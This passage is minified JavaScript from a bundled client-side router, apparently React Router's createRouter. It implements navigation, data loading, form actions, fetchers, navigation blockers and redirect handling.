    er(r.routes.length > 0, "You must provide a non-empty routes array to createRouter");
    let o = r.hydrationRouteProperties || [], i = r.mapRouteProperties || nz, n = {}, s = zm(r.routes, i, void 0, n), a, l = r.basename || "/", f = r.dataStrategy || lz, h = {
        unstable_middleware: !1,
        ...r.future
    }, p = null, b = new Set, v = null, T = null, x = null, E = r.hydrationData != null, B = Mc(s, r.history.location, l), P = !1, O = null, F;
    if (B == null && !r.patchRoutesOnNavigation) {
        let fe = Mi(404, {
            pathname: r.history.location.pathname
        })
          , {matches: ye, route: Ce} = LS(s);
        F = !0,
        B = ye,
        O = {
            [Ce.id]: fe
        }
    } else if (B && !r.hydrationData && di(B, s, r.history.location.pathname).active && (B = null),
    B)
        if (B.some(fe => fe.route.lazy))
            F = !1;
        else if (!B.some(fe => fe.route.loader))
            F = !0;
        else {
            let fe = r.hydrationData ? r.hydrationData.loaderData : null
              , ye = r.hydrationData ? r.hydrationData.errors : null;
            if (ye) {
                let Ce = B.findIndex(Ne => ye[Ne.route.id] !== void 0);
                F = B.slice(0, Ce + 1).every(Ne => !dE(Ne.route, fe, ye))
            } else
                F = B.every(Ce => !dE(Ce.route, fe, ye))
        }
    else {
        F = !1,
        B = [];
        let fe = di(null, s, r.history.location.pathname);
        fe.active && fe.matches && (P = !0,
        B = fe.matches)
    }
    let D, I = {
        historyAction: r.history.action,
        location: r.history.location,
        matches: B,
        initialized: F,
        navigation: Nv,
        restoreScrollPosition: r.hydrationData != null ? !1 : null,
        preventScrollReset: !1,
        revalidation: "idle",
        loaderData: r.hydrationData && r.hydrationData.loaderData || {},
        actionData: r.hydrationData && r.hydrationData.actionData || null,
        errors: r.hydrationData && r.hydrationData.errors || O,
        fetchers: new Map,
        blockers: new Map
    }, M = "POP", C = !1, W, k = !1, H = new Map, X = null, Y = !1, V = !1, R = new Set, _ = new Map, $ = 0, z = -1, K = new Map, j = new Set, ee = new Map, ie = new Map, ae = new Set, he = new Map, me, Pe = null;
    function _e() {
        if (p = r.history.listen( ({action: fe, location: ye, delta: Ce}) => {
            if (me) {
                me(),
                me = void 0;
                return
            }
            fn(he.size === 0 || Ce != null, "You are trying to use a blocker on a POP navigation to a location that was not created by @remix-run/router. This will fail silently in production. This can happen if you are navigating outside the router via `window.history.pushState`/`window.location.hash` instead of using router navigation APIs.  This can also happen if you are using createHashRouter and the user manually changes the URL.");
            let Ne = zt({
                currentLocation: I.location,
                nextLocation: ye,
                historyAction: fe
            });
            if (Ne && Ce != null) {
                let je = new Promise(nt => {
                    me = nt
                }
                );
                r.history.go(Ce * -1),
                wt(Ne, {
                    state: "blocked",
                    location: ye,
                    proceed() {
                        wt(Ne, {
                            state: "proceeding",
                            proceed: void 0,
                            reset: void 0,
                            location: ye
                        }),
                        je.then( () => r.history.go(Ce))
                    },
                    reset() {
                        let nt = new Map(I.blockers);
                        nt.set(Ne, np),
                        rt({
                            blockers: nt
                        })
                    }
                });
                return
            }
            return Ye(fe, ye)
        }
        ),
        t) {
            wz(e, H);
            let fe = () => vz(e, H);
            e.addEventListener("pagehide", fe),
            X = () => e.removeEventListener("pagehide", fe)
        }
        return I.initialized || Ye("POP", I.location, {
            initialHydration: !0
        }),
        D
    }
    function Fe() {
        p && p(),
        X && X(),
        b.clear(),
        W && W.abort(),
        I.fetchers.forEach( (fe, ye) => U(ye)),
        I.blockers.forEach( (fe, ye) => Yt(ye))
    }
    function Je(fe) {
        return b.add(fe),
        () => b.delete(fe)
    }
    function rt(fe, ye={}) {
        I = {
            ...I,
            ...fe
        };
        let Ce = []
          , Ne = [];
        I.fetchers.forEach( (je, nt) => {
            je.state === "idle" && (ae.has(nt) ? Ce.push(nt) : Ne.push(nt))
        }
        ),
        ae.forEach(je => {
            !I.fetchers.has(je) && !_.has(je) && Ce.push(je)
        }
        ),
        [...b].forEach(je => je(I, {
            deletedFetchers: Ce,
            viewTransitionOpts: ye.viewTransitionOpts,
            flushSync: ye.flushSync === !0
        })),
        Ce.forEach(je => U(je)),
        Ne.forEach(je => I.fetchers.delete(je))
    }
    function xt(fe, ye, {flushSync: Ce}={}) {
        var mt, Ct;
        let Ne = I.actionData != null && I.navigation.formMethod != null && ii(I.navigation.formMethod) && I.navigation.state === "loading" && ((mt = fe.state) == null ? void 0 : mt._isRedirect) !== !0, je;
        ye.actionData ? Object.keys(ye.actionData).length > 0 ? je = ye.actionData : je = null : Ne ? je = I.actionData : je = null;
        let nt = ye.loaderData ? US(I.loaderData, ye.loaderData, ye.matches || [], ye.errors) : I.loaderData
          , At = I.blockers;
        At.size > 0 && (At = new Map(At),
        At.forEach( (lt, St) => At.set(St, np)));
        let ot = C === !0 || I.navigation.formMethod != null && ii(I.navigation.formMethod) && ((Ct = fe.state) == null ? void 0 : Ct._isRedirect) !== !0;
        a && (s = a,
        a = void 0),
        Y || M === "POP" || (M === "PUSH" ? r.history.push(fe, fe.state) : M === "REPLACE" && r.history.replace(fe, fe.state));
        let bt;
        if (M === "POP") {
            let lt = H.get(I.location.pathname);
            lt && lt.has(fe.pathname) ? bt = {
                currentLocation: I.location,
                nextLocation: fe
            } : H.has(fe.pathname) && (bt = {
                currentLocation: fe,
                nextLocation: I.location
            })
        } else if (k) {
            let lt = H.get(I.location.pathname);
            lt ? lt.add(fe.pathname) : (lt = new Set([fe.pathname]),
            H.set(I.location.pathname, lt)),
            bt = {
                currentLocation: I.location,
                nextLocation: fe
            }
        }
        rt({
            ...ye,
            actionData: je,
            loaderData: nt,
            historyAction: M,
            location: fe,
            initialized: !0,
            navigation: Nv,
            revalidation: "idle",
            restoreScrollPosition: ji(fe, ye.matches || I.matches),
            preventScrollReset: ot,
            blockers: At
        }, {
            viewTransitionOpts: bt,
            flushSync: Ce === !0
        }),
        M = "POP",
        C = !1,
        k = !1,
        Y = !1,
        V = !1,
        Pe == null || Pe.resolve(),
        Pe = null
    }
    async function Tt(fe, ye) {
        if (typeof fe == "number") {
            r.history.go(fe);
            return
        }
        let Ce = fE(I.location, I.matches, l, fe, ye == null ? void 0 : ye.fromRouteId, ye == null ? void 0 : ye.relative)
          , {path: Ne, submission: je, error: nt} = _S(!1, Ce, ye)
          , At = I.location
          , ot = Up(I.location, Ne, ye && ye.state);
        ot = {
            ...ot,
            ...r.history.encodeLocation(ot)
        };
        let bt = ye && ye.replace != null ? ye.replace : void 0
          , mt = "PUSH";
        bt === !0 ? mt = "REPLACE" : bt === !1 || je != null && ii(je.formMethod) && je.formAction === I.location.pathname + I.location.search && (mt = "REPLACE");
        let Ct = ye && "preventScrollReset"in ye ? ye.preventScrollReset === !0 : void 0
          , lt = (ye && ye.flushSync) === !0
          , St = zt({
            currentLocation: At,
            nextLocation: ot,
            historyAction: mt
        });
        if (St) {
            wt(St, {
                state: "blocked",
                location: ot,
                proceed() {
                    wt(St, {
                        state: "proceeding",
                        proceed: void 0,
                        reset: void 0,
                        location: ot
                    }),
                    Tt(fe, ye)
                },
                reset() {
                    let Vt = new Map(I.blockers);
                    Vt.set(St, np),
                    rt({
                        blockers: Vt
                    })
                }
            });
            return
        }
        await Ye(mt, ot, {
            submission: je,
            pendingError: nt,
            preventScrollReset: Ct,
            replace: ye && ye.replace,
            enableViewTransition: ye && ye.viewTransition,
            flushSync: lt
        })
    }
    function Qe() {
        Pe || (Pe = Tz()),
        yt(),
        rt({
            revalidation: "loading"
        });
        let fe = Pe.promise;
        return I.navigation.state === "submitting" ? fe : I.navigation.state === "idle" ? (Ye(I.historyAction, I.location, {
            startUninterruptedRevalidation: !0
        }),
        fe) : (Ye(M || I.historyAction, I.navigation.location, {
            overrideNavigation: I.navigation,
            enableViewTransition: k === !0
        }),
        fe)
    }
    async function Ye(fe, ye, Ce) {
        W && W.abort(),
        W = null,
        M = fe,
        Y = (Ce && Ce.startUninterruptedRevalidation) === !0,
        oo(I.location, I.matches),
        C = (Ce && Ce.preventScrollReset) === !0,
        k = (Ce && Ce.enableViewTransition) === !0;
        let Ne = a || s
          , je = Ce && Ce.overrideNavigation
          , nt = Ce != null && Ce.initialHydration && I.matches && I.matches.length > 0 && !P ? I.matches : Mc(Ne, ye, l)
          , At = (Ce && Ce.flushSync) === !0;
        if (nt && I.initialized && !V && gz(I.location, ye) && !(Ce && Ce.submission && ii(Ce.submission.formMethod))) {
            xt(ye, {
                matches: nt
            }, {
                flushSync: At
            });
            return
        }
        let ot = di(nt, Ne, ye.pathname);
        if (ot.active && ot.matches && (nt = ot.matches),
        !nt) {
            let {error: De, notFoundMatches: Ge, route: kt} = zi(ye.pathname);
            xt(ye, {
                matches: Ge,
                loaderData: {},
                errors: {
                    [kt.id]: De
                }
            }, {
                flushSync: At
            });
            return
        }
        W = new AbortController;
        let bt = kf(r.history, ye, W.signal, Ce && Ce.submission), mt = new SS(r.unstable_getContext ? await r.unstable_getContext() : void 0), Ct;
        if (Ce && Ce.pendingError)
            Ct = [Rl(nt).route.id, {
                type: "error",
                error: Ce.pendingError
            }];
        else if (Ce && Ce.submission && ii(Ce.submission.formMethod)) {
            let De = await Bt(bt, ye, Ce.submission, nt, mt, ot.active, Ce && Ce.initialHydration === !0, {
                replace: Ce.replace,
                flushSync: At
            });
            if (De.shortCircuited)
                return;
            if (De.pendingActionResult) {
                let[Ge,kt] = De.pendingActionResult;
                if (oi(kt) && kp(kt.error) && kt.error.status === 404) {
                    W = null,
                    xt(ye, {
                        matches: De.matches,
                        loaderData: {},
                        errors: {
                            [Ge]: kt.error
                        }
                    });
                    return
                }
            }
            nt = De.matches || nt,
            Ct = De.pendingActionResult,
            je = Dv(ye, Ce.submission),
            At = !1,
            ot.active = !1,
            bt = kf(r.history, bt.url, bt.signal)
        }
        let {shortCircuited: lt, matches: St, loaderData: Vt, errors: Ht} = await Dr(bt, ye, nt, mt, ot.active, je, Ce && Ce.submission, Ce && Ce.fetcherSubmission, Ce && Ce.replace, Ce && Ce.initialHydration === !0, At, Ct);
        lt || (W = null,
        xt(ye, {
            matches: St || nt,
            ...kS(Ct),
            loaderData: Vt,
            errors: Ht
        }))
    }
    async function Bt(fe, ye, Ce, Ne, je, nt, At, ot={}) {
        yt();
        let bt = mz(ye, Ce);
        if (rt({
            navigation: bt
        }, {
            flushSync: ot.flushSync === !0
        }),
        nt) {
            let lt = await jr(Ne, ye.pathname, fe.signal);
            if (lt.type === "aborted")
                return {
                    shortCircuited: !0
                };
            if (lt.type === "error") {
                let St = Rl(lt.partialMatches).route.id;
                return {
                    matches: lt.partialMatches,
                    pendingActionResult: [St, {
                        type: "error",
                        error: lt.error
                    }]
                }
            } else if (lt.matches)
                Ne = lt.matches;
            else {
                let {notFoundMatches: St, error: Vt, route: Ht} = zi(ye.pathname);
                return {
                    matches: St,
                    pendingActionResult: [Ht.id, {
                        type: "error",
                        error: Vt
                    }]
                }
            }
        }
        let mt, Ct = Cp(Ne, ye);
        if (!Ct.route.action && !Ct.route.lazy)
            mt = {
                type: "error",
                error: Mi(405, {
                    method: fe.method,
                    pathname: ye.pathname,
                    routeId: Ct.route.id
                })
            };
        else {
            let lt = Zf(i, n, fe, Ne, Ct, At ? [] : o, je)
              , St = await $e(fe, lt, je, null);
            if (mt = St[Ct.route.id],
            !mt) {
                for (let Vt of Ne)
                    if (St[Vt.route.id]) {
                        mt = St[Vt.route.id];
                        break
                    }
            }
            if (fe.signal.aborted)
                return {
                    shortCircuited: !0
                }
        }
        if (Ll(mt)) {
            let lt;
            return ot && ot.replace != null ? lt = ot.replace : lt = NS(mt.response.headers.get("Location"), new URL(fe.url), l) === I.location.pathname + I.location.search,
            await Re(fe, mt, !0, {
                submission: Ce,
                replace: lt
            }),
            {
                shortCircuited: !0
            }
        }
        if (oi(mt)) {
            let lt = Rl(Ne, Ct.route.id);
            return (ot && ot.replace) !== !0 && (M = "PUSH"),
            {
                matches: Ne,
                pendingActionResult: [lt.route.id, mt, Ct.route.id]
            }
        }
        return {
            matches: Ne,
            pendingActionResult: [Ct.route.id, mt]
        }
    }
    async function Dr(fe, ye, Ce, Ne, je, nt, At, ot, bt, mt, Ct, lt) {
        let St = nt || Dv(ye, At)
          , Vt = At || ot || zS(St)
          , Ht = !Y && !mt;
        if (je) {
            if (Ht) {
                let y = Cr(lt);
                rt({
                    navigation: St,
                    ...y !== void 0 ? {
                        actionData: y
                    } : {}
                }, {
                    flushSync: Ct
                })
            }
            let Wt = await jr(Ce, ye.pathname, fe.signal);
            if (Wt.type === "aborted")
                return {
                    shortCircuited: !0
                };
            if (Wt.type === "error") {
                let y = Rl(Wt.partialMatches).route.id;
                return {
                    matches: Wt.partialMatches,
                    loaderData: {},
                    errors: {
                        [y]: Wt.error
                    }
                }
            } else if (Wt.matches)
                Ce = Wt.matches;
            else {
                let {error: y, notFoundMatches: m, route: S} = zi(ye.pathname);
                return {
                    matches: m,
                    loaderData: {},
                    errors: {
                        [S.id]: y
                    }
                }
            }
        }
        let De = a || s
          , {dsMatches: Ge, revalidatingFetchers: kt} = IS(fe, Ne, i, n, r.history, I, Ce, Vt, ye, mt ? [] : o, mt === !0, V, R, ae, ee, j, De, l, lt);
        if (z = ++$,
        !r.dataStrategy && !Ge.some(Wt => Wt.shouldLoad) && kt.length === 0) {
            let Wt = Ie();
            return xt(ye, {
                matches: Ce,
                loaderData: {},
                errors: lt && oi(lt[1]) ? {
                    [lt[0]]: lt[1].error
                } : null,
                ...kS(lt),
                ...Wt ? {
                    fetchers: new Map(I.fetchers)
                } : {}
            }, {
                flushSync: Ct
            }),
            {
                shortCircuited: !0
            }
        }
        if (Ht) {
            let Wt = {};
            if (!je) {
                Wt.navigation = St;
                let y = Cr(lt);
                y !== void 0 && (Wt.actionData = y)
            }
            kt.length > 0 && (Wt.fetchers = se(kt)),
            rt(Wt, {
                flushSync: Ct
            })
        }
        kt.forEach(Wt => {
            J(Wt.key),
            Wt.controller && _.set(Wt.key, Wt.controller)
        }
        );
        let mn = () => kt.forEach(Wt => J(Wt.key));
        W && W.signal.addEventListener("abort", mn);
        let {loaderResults: Lt, fetcherResults: Le} = await st(Ge, kt, fe, Ne);
        if (fe.signal.aborted)
            return {
                shortCircuited: !0
            };
        W && W.signal.removeEventListener("abort", mn),
        kt.forEach(Wt => _.delete(Wt.key));
        let te = Kg(Lt);
        if (te)
            return await Re(fe, te.result, !0, {
                replace: bt
            }),
            {
                shortCircuited: !0
            };
        if (te = Kg(Le),
        te)
            return j.add(te.key),
            await Re(fe, te.result, !0, {
                replace: bt
            }),
            {
                shortCircuited: !0
            };
        let {loaderData: qo, errors: Pt} = FS(I, Ce, Lt, lt, kt, Le);
        mt && I.errors && (Pt = {
            ...I.errors,
            ...Pt
        });
        let Gt = Ie()
          , it = re(z)
          , sn = Gt || it || kt.length > 0;
        return {
            matches: Ce,
            loaderData: qo,
            errors: Pt,
            ...sn ? {
                fetchers: new Map(I.fetchers)
            } : {}
        }
    }
    function Cr(fe) {
        if (fe && !oi(fe[1]))
            return {
                [fe[0]]: fe[1].data
            };
        if (I.actionData)
            return Object.keys(I.actionData).length === 0 ? null : I.actionData
    }
    function se(fe) {
        return fe.forEach(ye => {
            let Ce = I.fetchers.get(ye.key)
              , Ne = op(void 0, Ce ? Ce.data : void 0);
            I.fetchers.set(ye.key, Ne)
        }
        ),
        new Map(I.fetchers)
    }
    async function le(fe, ye, Ce, Ne) {
        J(fe);
        let je = (Ne && Ne.flushSync) === !0
          , nt = a || s
          , At = fE(I.location, I.matches, l, Ce, ye, Ne == null ? void 0 : Ne.relative)
          , ot = Mc(nt, At, l)
          , bt = di(ot, nt, At);
        if (bt.active && bt.matches && (ot = bt.matches),
        !ot) {
            Z(fe, ye, Mi(404, {
                pathname: At
            }), {
                flushSync: je
            });
            return
        }
        let {path: mt, submission: Ct, error: lt} = _S(!0, At, Ne);
        if (lt) {
            Z(fe, ye, lt, {
                flushSync: je
            });
            return
        }
        let St = Cp(ot, mt)
          , Vt = new SS(r.unstable_getContext ? await r.unstable_getContext() : void 0)
          , Ht = (Ne && Ne.preventScrollReset) === !0;
        if (Ct && ii(Ct.formMethod)) {
            await Te(fe, ye, mt, St, ot, Vt, bt.active, je, Ht, Ct);
            return
        }
        ee.set(fe, {
            routeId: ye,
            path: mt
        }),
        await Ue(fe, ye, mt, St, ot, Vt, bt.active, je, Ht, Ct)
    }
    async function Te(fe, ye, Ce, Ne, je, nt, At, ot, bt, mt) {
        yt(),
        ee.delete(fe);
        function Ct(oe) {
            if (!oe.route.action && !oe.route.lazy) {
                let be = Mi(405, {
                    method: mt.formMethod,
                    pathname: Ce,
                    routeId: ye
                });
                return Z(fe, ye, be, {
                    flushSync: ot
                }),
                !0
            }
            return !1
        }
        if (!At && Ct(Ne))
            return;
        let lt = I.fetchers.get(fe);
        vt(fe, xz(mt, lt), {
            flushSync: ot
        });
        let St = new AbortController
          , Vt = kf(r.history, Ce, St.signal, mt);
        if (At) {
            let oe = await jr(je, Ce, Vt.signal, fe);
            if (oe.type === "aborted")
                return;
            if (oe.type === "error") {
                Z(fe, ye, oe.error, {
                    flushSync: ot
                });
                return
            } else if (oe.matches) {
                if (je = oe.matches,
                Ne = Cp(je, Ce),
                Ct(Ne))
                    return
            } else {
                Z(fe, ye, Mi(404, {
                    pathname: Ce
                }), {
                    flushSync: ot
                });
                return
            }
        }
        _.set(fe, St);
        let Ht = $
          , De = Zf(i, n, Vt, je, Ne, o, nt)
          , kt = (await $e(Vt, De, nt, fe))[Ne.route.id];
        if (Vt.signal.aborted) {
            _.get(fe) === St && _.delete(fe);
            return
        }
        if (ae.has(fe)) {
            if (Ll(kt) || oi(kt)) {
                vt(fe, Ic(void 0));
                return
            }
        } else {
            if (Ll(kt))
                if (_.delete(fe),
                z > Ht) {
                    vt(fe, Ic(void 0));
                    return
                } else
                    return j.add(fe),
                    vt(fe, op(mt)),
                    Re(Vt, kt, !1, {
                        fetcherSubmission: mt,
                        preventScrollReset: bt
                    });
            if (oi(kt)) {
                Z(fe, ye, kt.error);
                return
            }
        }
        let mn = I.navigation.location || I.location
          , Lt = kf(r.history, mn, St.signal)
          , Le = a || s
          , te = I.navigation.state !== "idle" ? Mc(Le, I.navigation.location, l) : I.matches;
        er(te, "Didn't find any matches after fetcher action");
        let qo = ++$;
        K.set(fe, qo);
        let Pt = op(mt, kt.data);
        I.fetchers.set(fe, Pt);
        let {dsMatches: Gt, revalidatingFetchers: it} = IS(Lt, nt, i, n, r.history, I, te, mt, mn, o, !1, V, R, ae, ee, j, Le, l, [Ne.route.id, kt]);
        it.filter(oe => oe.key !== fe).forEach(oe => {
            let be = oe.key
              , ze = I.fetchers.get(be)
              , at = op(void 0, ze ? ze.data : void 0);
            I.fetchers.set(be, at),
            J(be),
            oe.controller && _.set(be, oe.controller)
        }
        ),
        rt({
            fetchers: new Map(I.fetchers)
        });
        let sn = () => it.forEach(oe => J(oe.key));
        St.signal.addEventListener("abort", sn);
        let {loaderResults: Wt, fetcherResults: y} = await st(Gt, it, Lt, nt);
        if (St.signal.aborted)
            return;
        if (St.signal.removeEventListener("abort", sn),
        K.delete(fe),
        _.delete(fe),
        it.forEach(oe => _.delete(oe.key)),
        I.fetchers.has(fe)) {
            let oe = Ic(kt.data);
            I.fetchers.set(fe, oe)
        }
        let m = Kg(Wt);
        if (m)
            return Re(Lt, m.result, !1, {
                preventScrollReset: bt
            });
        if (m = Kg(y),
        m)
            return j.add(m.key),
            Re(Lt, m.result, !1, {
                preventScrollReset: bt
            });
        let {loaderData: S, errors: G} = FS(I, te, Wt, void 0, it, y);
        re(qo),
        I.navigation.state === "loading" && qo > z ? (er(M, "Expected pending action"),
        W && W.abort(),
        xt(I.navigation.location, {
            matches: te,
            loaderData: S,
            errors: G,
            fetchers: new Map(I.fetchers)
        })) : (rt({
            errors: G,
            loaderData: US(I.loaderData, S, te, G),
            fetchers: new Map(I.fetchers)
        }),
        V = !1)
    }
    async function Ue(fe, ye, Ce, Ne, je, nt, At, ot, bt, mt) {
        let Ct = I.fetchers.get(fe);
        vt(fe, op(mt, Ct ? Ct.data : void 0), {
            flushSync: ot
        });
        let lt = new AbortController
          , St = kf(r.history, Ce, lt.signal);
        if (At) {
            let kt = await jr(je, Ce, St.signal, fe);
            if (kt.type === "aborted")
                return;
            if (kt.type === "error") {
                Z(fe, ye, kt.error, {
                    flushSync: ot
                });
                return
            } else if (kt.matches)
                je = kt.matches,
                Ne = Cp(je, Ce);
            else {
                Z(fe, ye, Mi(404, {
                    pathname: Ce
                }), {
                    flushSync: ot
                });
                return
            }
        }
        _.set(fe, lt);
        let Vt = $
          , Ht = Zf(i, n, St, je, Ne, o, nt)
          , Ge = (await $e(St, Ht, nt, fe))[Ne.route.id];
        if (_.get(fe) === lt && _.delete(fe),
        !St.signal.aborted) {
            if (ae.has(fe)) {
                vt(fe, Ic(void 0));
                return
            }
            if (Ll(Ge))
                if (z > Vt) {
                    vt(fe, Ic(void 0));
                    return
                } else {
                    j.add(fe),
                    await Re(St, Ge, !1, {
                        preventScrollReset: bt
                    });
                    return
                }
            if (oi(Ge)) {
                Z(fe, ye, Ge.error);
                return
            }
            vt(fe, Ic(Ge.data))
        }
    }
    async function Re(fe, ye, Ce, {submission: Ne, fetcherSubmission: je, preventScrollReset: nt, replace: At}={}) {
        ye.response.headers.has("X-Remix-Revalidate") && (V = !0);
        let ot = ye.response.headers.get("Location");
        er(ot, "Expected a Location header on the redirect Response"),
        ot = NS(ot, new URL(fe.url), l);
        let bt = Up(I.location, ot, {
            _isRedirect: !0
        });
        if (t) {
            let Ht = !1;
            if (ye.response.headers.has("X-Remix-Reload-Document"))
                Ht = !0;
            else if (HA.test(ot)) {
                const De = XW(ot, !0);
                Ht = De.origin !== e.location.origin || Li(De.pathname, l) == null
            }
            if (Ht) {
                At ? e.location.replace(ot) : e.location.assign(ot);
                return
            }
        }
        W = null;
        let mt = At === !0 || ye.response.headers.has("X-Remix-Replace") ? "REPLACE" : "PUSH"
          , {formMethod: Ct, formAction: lt, formEncType: St} = I.navigation;
        !Ne && !je && Ct && lt && St && (Ne = zS(I.navigation));
        let Vt = Ne || je;
        if (tz.has(ye.response.status) && Vt && ii(Vt.formMethod))
            await Ye(mt, bt, {
                submission: {
                    ...Vt,
                    formAction: ot
                },
                preventScrollReset: nt || C,
                enableViewTransition: Ce ? k : void 0
            });
        else {
            let Ht = Dv(bt, Ne);
            await Ye(mt, bt, {
                overrideNavigation: Ht,
                fetcherSubmission: je,
                preventScrollReset: nt || C,
                enableViewTransition: Ce ? k : void 0
            })
        }
    }
    async function $e(fe, ye, Ce, Ne) {
        let je, nt = {};
        try {
            je = await uz(f, fe, ye, Ne, Ce, !1)
        } catch (At) {
            return ye.filter(ot => ot.shouldLoad).forEach(ot => {
                nt[ot.route.id] = {
                    type: "error",
                    error: At
                }
            }
            ),
            nt
        }
        if (fe.signal.aborted)
            return nt;
        for (let[At,ot] of Object.entries(je))
            if (yz(ot)) {
                let bt = ot.result;
                nt[At] = {
                    type: "redirect",
                    response: hz(bt, fe, At, ye, l)
                }
            } else
                nt[At] = await dz(ot);
        return nt
    }
    async function st(fe, ye, Ce, Ne) {
        let je = $e(Ce, fe, Ne, null)
          , nt = Promise.all(ye.map(async bt => {
            if (bt.matches && bt.match && bt.request && bt.controller) {
                let Ct = (await $e(bt.request, bt.matches, Ne, bt.key))[bt.match.route.id];
                return {
                    [bt.key]: Ct
                }
            } else
                return Promise.resolve({
                    [bt.key]: {
                        type: "error",
                        error: Mi(404, {
                            pathname: bt.path
                        })
                    }
                })
        }
        ))
          , At = await je
          , ot = (await nt).reduce( (bt, mt) => Object.assign(bt, mt), {});
        return {
            loaderResults: At,
            fetcherResults: ot
        }
    }
    function yt() {
        V = !0,
        ee.forEach( (fe, ye) => {
            _.has(ye) && R.add(ye),
            J(ye)
        }
        )
    }
    function vt(fe, ye, Ce={}) {
        I.fetchers.set(fe, ye),
        rt({
            fetchers: new Map(I.fetchers)
        }, {
            flushSync: (Ce && Ce.flushSync) === !0
        })
    }
    function Z(fe, ye, Ce, Ne={}) {
        let je = Rl(I.matches, ye);
        U(fe),
        rt({
            errors: {
                [je.route.id]: Ce
            },
            fetchers: new Map(I.fetchers)
        }, {
            flushSync: (Ne && Ne.flushSync) === !0
        })
    }
    function N(fe) {
        return ie.set(fe, (ie.get(fe) || 0) + 1),
        ae.has(fe) && ae.delete(fe),
        I.fetchers.get(fe) || rz
    }
    function U(fe) {
        let ye = I.fetchers.get(fe);
        _.has(fe) && !(ye && ye.state === "loading" && K.has(fe)) && J(fe),
        ee.delete(fe),
        K.delete(fe),
        j.delete(fe),
        ae.delete(fe),
        R.delete(fe),
        I.fetchers.delete(fe)
    }
    function ne(fe) {
        let ye = (ie.get(fe) || 0) - 1;
        ye <= 0 ? (ie.delete(fe),
        ae.add(fe)) : ie.set(fe, ye),
        rt({
            fetchers: new Map(I.fetchers)
        })
    }
    function J(fe) {
        let ye = _.get(fe);
        ye && (ye.abort(),
        _.delete(fe))
    }
    function Ee(fe) {
        for (let ye of fe) {
            let Ce = N(ye)
              , Ne = Ic(Ce.data);
            I.fetchers.set(ye, Ne)
        }
    }
    function Ie() {
        let fe = []
          , ye = !1;
        for (let Ce of j) {
            let Ne = I.fetchers.get(Ce);
            er(Ne, `Expected fetcher: ${Ce}`),
            Ne.state === "loading" && (j.delete(Ce),
            fe.push(Ce),
            ye = !0)
        }
        return Ee(fe),
        ye
    }
    function re(fe) {
        let ye = [];
        for (let[Ce,Ne] of K)
            if (Ne < fe) {
                let je = I.fetchers.get(Ce);
                er(je, `Expected fetcher: ${Ce}`),
                je.state === "loading" && (J(Ce),
                K.delete(Ce),
                ye.push(Ce))
            }
        return Ee(ye),
        ye.length > 0
    }
    function Nt(fe, ye) {
        let Ce = I.blockers.get(fe) || np;
        return he.get(fe) !== ye && he.set(fe, ye),
        Ce
    }
    function Yt(fe) {
        I.blockers.delete(fe),
        he.delete(fe)
    }
    function wt(fe, ye) {
        let Ce = I.blockers.get(fe) || np;
        er(Ce.state === "unblocked" && ye.state === "blocked" || Ce.state === "blocked" && ye.state === "blocked" || Ce.state === "blocked" && ye.state === "proceeding" || Ce.state === "blocked" && ye.state === "unblocked" || Ce.state === "proceeding" && ye.state === "unblocked", `Invalid blocker state transition: ${Ce.state} -> ${ye.state}`);
        let Ne = new Map(I.blockers);
        Ne.set(fe, ye),
        rt({
            blockers: Ne
        })
    }
    function zt({currentLocation: fe, nextLocation: ye, historyAction: Ce}) {
        if (he.size === 0)
            return;
        he.size > 1 && fn(!1, "A router only supports one blocker at a time");
        let Ne = Array.from(he.entries())
          , [je,nt] = Ne[Ne.length - 1]
          , At = I.blockers.get(je);
        if (!(At && At.state === "proceeding") && nt({
            currentLocation: fe,
            nextLocation: ye,
            historyAction: Ce
        }))
            return je
    }
    function zi(fe) {
        let ye = Mi(404, {
            pathname: fe
        })
          , Ce = a || s
          , {matches: Ne, route: je} = LS(Ce);
        return {
            notFoundMatches: Ne,
            route: je,
            error: ye
        }
    }
    function Ke(fe, ye, Ce) {
        if (v = fe,
        x = ye,
        T = Ce || null,
        !E && I.navigation === Nv) {
            E = !0;
            let Ne = ji(I.location, I.matches);
            Ne != null && rt({
                restoreScrollPosition: Ne
            })
        }
        return () => {
            v = null,
            x = null,
            T = null
        }
    }
    function jo(fe, ye) {
        return T && T(fe, ye.map(Ne => W$(Ne, I.loaderData))) || fe.key
    }
    function oo(fe, ye) {
        if (v && x) {
            let Ce = jo(fe, ye);
            v[Ce] = x()
        }
    }
    function ji(fe, ye) {
        if (v) {
            let Ce = jo(fe, ye)
              , Ne = v[Ce];
            if (typeof Ne == "number")
                return Ne
        }
        return null
    }
    function di(fe, ye, Ce) {
        if (r.patchRoutesOnNavigation)
            if (fe) {
                if (Object.keys(fe[0].params).length > 0)
                    return {
                        active: !0,
                        matches: pm(ye, Ce, l, !0)
                    }
            } else
                return {
                    active: !0,
                    matches: pm(ye, Ce, l, !0) || []
                };
        return {
            active: !1,
            matches: null
        }
    }
    async function jr(fe, ye, Ce, Ne) {
        if (!r.patchRoutesOnNavigation)
            return {
                type: "success",
                matches: fe
            };
        let je = fe;
        for (; ; ) {
            let nt = a == null
              , At = a || s
              , ot = n;
            try {
                await r.patchRoutesOnNavigation({
                    signal: Ce,
                    path: ye,
                    matches: je,
                    fetcherKey: Ne,
                    patch: (Ct, lt) => {
                        Ce.aborted || OS(Ct, lt, At, ot, i)
                    }
                })
            } catch (Ct) {
                return {
                    type: "error",
                    error: Ct,
                    partialMatches: je
                }
            } finally {
                nt && !Ce.aborted && (s = [...s])
            }
            if (Ce.aborted)
                return {
                    type: "aborted"
                };
            let bt = Mc(At, ye, l);
            if (bt)
                return {
                    type: "success",
                    matches: bt
                };
            let mt = pm(At, ye, l, !0);
            if (!mt || je.length === mt.length && je.every( (Ct, lt) => Ct.route.id === mt[lt].route.id))
                return {
                    type: "success",
                    matches: null
                };
            je = mt
        }
    }
    function bs(fe) {
        n = {},
        a = zm(fe, i, void 0, n)
    }
    function ms(fe, ye) {
        let Ce = a == null;
        OS(fe, ye, a || s, n, i),
        Ce && (s = [...s],
        rt({}))
    }
    return D = {
        get basename() {
            return l
        },
        get future() {
            return h
        },
        get state() {
            return I
        },
        get routes() {
            return s
        },
        get window() {
            return e
        },
        initialize: _e,
        subscribe: Je,
        enableScrollRestoration: Ke,
        navigate: Tt,
        fetch: le,
        revalidate: Qe,
        createHref: fe => r.history.createHref(fe),
        encodeLocation: fe => r.history.encodeLocation(fe),
        getFetcher: N,
        deleteFetcher: ne,
        dispose: Fe,
        getBlocker: Nt,
        deleteBlocker: Yt,
        patchRoutes: ms,
        _internalFetchControllers: _,
        _internalSetRoutes: bs
    },
    D
}
function iz(r) {
    return r != null && ("formData"in r && r.formData != null || "body"in r && r.body !== void 0)
}
